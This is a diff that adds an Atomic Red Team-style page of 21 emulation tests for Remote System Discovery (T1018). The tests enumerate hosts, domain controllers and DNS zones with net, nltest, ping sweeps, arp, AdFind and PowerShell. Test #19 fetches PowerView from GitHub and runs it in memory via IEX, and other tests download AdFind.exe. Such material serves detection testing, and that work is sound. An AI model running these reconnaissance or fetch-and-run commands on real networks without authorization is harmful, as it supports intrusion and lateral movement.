@@ -1,0 +1,788 @@
+---
+tags: [T1018, atomic_test]
+filename: "[[T1018 - Remote System Discovery]]"
+---
+# T1018 - Remote System Discovery
+
+## Atomic Test #1 - Remote System Discovery - net
+Identify remote systems with net.exe.
+
+Upon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 85321a9c-897f-4a60-9f20-29788e50bccd
+
+
+
+
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+net view /domain
+net view
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #2 - Remote System Discovery - net group Domain Computers
+Identify remote systems with net.exe querying the Active Directory Domain Computers group.
+
+Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the "Domain Computers" group. Output will be via stdout.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** f1bf6c8f-9016-4edf-aff9-80b65f5d711f
+
+
+
+
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+net group "Domain Computers" /domain
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #3 - Remote System Discovery - nltest
+Identify domain controllers for specified domain.
+
+Upon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 52ab5108-3f6f-42fb-8ba3-73bc054f22c8
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| target_domain | Domain to query for domain controllers | string | %userdnsdomain%|
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+nltest.exe /dclist:#{target_domain}
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #4 - Remote System Discovery - ping sweep
+Identify remote systems via ping sweep.
+
+Upon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 6db1f57f-d1d5-4223-8a66-55c9c65a9592
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| start_host | Last octet starting value for ping sweep. | string | 1|
+| stop_host | Last octet ending value for ping sweep. | string | 254|
+| subnet | Subnet used for ping sweep. | string | 192.168.1|
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #5 - Remote System Discovery - arp
+Identify remote systems via arp. 
+
+Upon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 2d5a61f5-0447-4be4-944a-1f8530ed6574
+
+
+
+
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+arp -a
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #6 - Remote System Discovery - arp nix
+Identify remote systems via arp.
+
+Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
+
+**Supported Platforms:** Linux, macOS
+
+
+**auto_generated_guid:** acb6b1ff-e2ad-4d64-806c-6c35fe73b951
+
+
+
+
+
+
+#### Attack Commands: Run with `sh`! 
+
+
+```sh
+arp -a | grep -v '^?'
+```
+
+
+
+
+#### Dependencies:  Run with `sh`!
+##### Description: Check if arp command exists on the machine
+##### Check Prereq Commands:
+```sh
+if [ -x "$(command -v arp)" ]; then exit 0; else exit 1; fi;
+```
+##### Get Prereq Commands:
+```sh
+(which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools)
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #7 - Remote System Discovery - sweep
+Identify remote systems via ping sweep.
+
+Upon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.
+
+**Supported Platforms:** Linux, macOS
+
+
+**auto_generated_guid:** 96db2632-8417-4dbb-b8bb-a8b92ba391de
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| start_host | Subnet used for ping sweep. | string | 1|
+| stop_host | Subnet used for ping sweep. | string | 254|
+| subnet | Subnet used for ping sweep. | string | 192.168.1|
+
+
+#### Attack Commands: Run with `sh`! 
+
+
+```sh
+for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo "#{subnet}.$ip UP" || : ; done
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #8 - Remote System Discovery - nslookup
+Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.
+
+Upon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** baa01aaa-5e13-45ec-8a0d-e46c93c9760f
+
+
+
+
+
+
+#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 
+
+
+```powershell
+$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
+$pieces = $localip.split(".")
+$firstOctet = $pieces[0]
+$secondOctet = $pieces[1]
+$thirdOctet = $pieces[2]
+foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #9 - Remote System Discovery - adidnsdump
+This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks
+Python 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.
+Successful execution of this test will list dns zones in the terminal.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 95e19466-469e-4316-86d2-1dc401b5a959
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| user_name | username including domain. | string | domain&#92;user|
+| acct_pass | Account password. | string | password|
+| host_name | hostname or ip address to connect to. | string | 192.168.1.1|
+
+
+#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 
+
+
+```cmd
+adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
+```
+
+
+
+
+#### Dependencies:  Run with `powershell`!
+##### Description: Computer must have python 3 installed
+##### Check Prereq Commands:
+```powershell
+if (python --version) {exit 0} else {exit 1}
+```
+##### Get Prereq Commands:
+```powershell
+echo "Python 3 must be installed manually"
+```
+##### Description: Computer must have pip installed
+##### Check Prereq Commands:
+```powershell
+if (pip3 -V) {exit 0} else {exit 1}
+```
+##### Get Prereq Commands:
+```powershell
+echo "PIP must be installed manually"
+```
+##### Description: adidnsdump must be installed and part of PATH
+##### Check Prereq Commands:
+```powershell
+if (cmd /c adidnsdump -h) {exit 0} else {exit 1}
+```
+##### Get Prereq Commands:
+```powershell
+pip3 install adidnsdump
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #10 - Adfind - Enumerate Active Directory Computer Objects
+Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects
+reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** a889f5be-2d54-4050-bd05-884578748bb4
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| optional_args | Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces. | string | |
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=computer) #{optional_args}
+```
+
+
+
+
+#### Dependencies:  Run with `powershell`!
+##### Description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
+##### Check Prereq Commands:
+```powershell
+if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
+```
+##### Get Prereq Commands:
+```powershell
+New-Item -Type Directory (split-path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
+Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #11 - Adfind - Enumerate Active Directory Domain Controller Objects
+Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects
+reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 5838c31e-a0e2-4b9f-b60a-d79d2cb7995e
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| optional_args | Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces. | string | |
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -sc dclist
+```
+
+
+
+
+#### Dependencies:  Run with `powershell`!
+##### Description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
+##### Check Prereq Commands:
+```powershell
+if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
+```
+##### Get Prereq Commands:
+```powershell
+New-Item -Type Directory (split-path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
+Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #12 - Remote System Discovery - ip neighbour
+Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment.
+
+**Supported Platforms:** Linux
+
+
+**auto_generated_guid:** 158bd4dd-6359-40ab-b13c-285b9ef6fa25
+
+
+
+
+
+
+#### Attack Commands: Run with `sh`! 
+
+
+```sh
+ip neighbour show
+```
+
+
+
+
+#### Dependencies:  Run with `sh`!
+##### Description: Check if ip command exists on the machine
+##### Check Prereq Commands:
+```sh
+if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;
+```
+##### Get Prereq Commands:
+```sh
+apt-get install iproute2 -y
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #13 - Remote System Discovery - ip route
+Use the ip route command to display the kernels routing tables.
+
+**Supported Platforms:** Linux
+
+
+**auto_generated_guid:** 1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1
+
+
+
+
+
+
+#### Attack Commands: Run with `sh`! 
+
+
+```sh
+ip route show
+```
+
+
+
+
+#### Dependencies:  Run with `sh`!
+##### Description: Check if ip command exists on the machine
+##### Check Prereq Commands:
+```sh
+if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;
+```
+##### Get Prereq Commands:
+```sh
+apt-get install iproute2 -y
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #14 - Remote System Discovery - netstat
+Use the netstat command to display the kernels routing tables.
+
+**Supported Platforms:** Linux
+
+
+**auto_generated_guid:** d2791d72-b67f-4615-814f-ec824a91f514
+
+
+
+
+
+
+#### Attack Commands: Run with `sh`! 
+
+
+```sh
+netstat -r | grep default
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #15 - Remote System Discovery - ip tcp_metrics
+Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses.
+
+**Supported Platforms:** Linux
+
+
+**auto_generated_guid:** 6c2da894-0b57-43cb-87af-46ea3b501388
+
+
+
+
+
+
+#### Attack Commands: Run with `sh`! 
+
+
+```sh
+ip tcp_metrics show |grep --invert-match "^127\."
+```
+
+
+
+
+#### Dependencies:  Run with `sh`!
+##### Description: Check if ip command exists on the machine
+##### Check Prereq Commands:
+```sh
+if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;
+```
+##### Get Prereq Commands:
+```sh
+apt-get install iproute2 -y
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #16 - Enumerate domain computers within Active Directory using DirectorySearcher
+This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. 
+This test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. 
+Reference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). 
+Upon successful execution, this test will output the names of the computers that reside on the domain to the console window.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 962a6017-1c09-45a6-880b-adc9c57cb22e
+
+
+
+
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")
+$DirectorySearcher.PropertiesToLoad.Add("Name")
+$Computers = $DirectorySearcher.findall()
+foreach ($Computer in $Computers) {
+  $Computer = $Computer.Properties.name
+  if (!$Computer) { Continue }
+  Write-Host $Computer}
+```
+
+
+
+
+#### Dependencies:  Run with `powershell`!
+##### Description: This PC must be joined to a domain.
+##### Check Prereq Commands:
+```powershell
+if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}
+```
+##### Get Prereq Commands:
+```powershell
+write-host "This PC must be manually added to a domain."
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #17 - Enumerate Active Directory Computers with Get-AdComputer
+The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.
+Upon successful execution a listing of Computers will output with their paths in AD.
+Reference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 97e89d9e-e3f5-41b5-a90f-1e0825df0fdf
+
+
+
+
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+Get-AdComputer -Filter *
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #18 - Enumerate Active Directory Computers with ADSISearcher
+The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.
+Upon successful execution a listing of computers will output with their paths in AD.
+Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 64ede6ac-b57a-41c2-a7d1-32c6cd35397d
+
+
+
+
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #19 - Get-DomainController with PowerView
+Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** b9d2e8ca-5520-4737-8076-4f08913da2c4
+
+
+
+
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #20 - Get-WmiObject to Enumerate Domain Controllers
+The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.
+Upon successful execution a listing of Systems from AD will output with their paths.
+Reference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad
+
+
+
+
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
+catch { $_; exit $_.Exception.HResult }
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #21 - Remote System Discovery - net group Domain Controller
+Identify remote systems with net.exe querying the Active Directory Domain Controller.
+Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the "Domain Controller" in the domain. Output will be via stdout.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 5843529a-5056-4bc1-9c13-a311e2af4ca0
+
+
+
+
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+net group /domain "Domain controllers"
+```
+
+
+
+
+
+
+<br/>
